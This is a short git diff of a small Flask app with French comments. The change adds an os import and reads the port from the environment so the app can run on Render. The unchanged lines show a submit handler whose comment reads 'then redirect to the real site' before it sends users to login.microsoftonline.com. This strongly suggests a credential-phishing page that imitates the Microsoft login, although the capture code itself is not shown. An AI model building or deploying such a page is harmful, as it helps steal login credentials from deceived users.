@@ -1,4 +1,5 @@
 from flask import Flask, request, render_template_string, redirect
+import os
 
 app = Flask(__name__)
 
@@ -24,6 +25,7 @@ def submit():
     # Ensuite, rediriger vers le vrai site
     return redirect("https://login.microsoftonline.com")
 
-# Démarrer le petit serveur
+# 🟢 Démarrer le serveur compatible Render
 if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=5000)
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host="0.0.0.0", port=port)
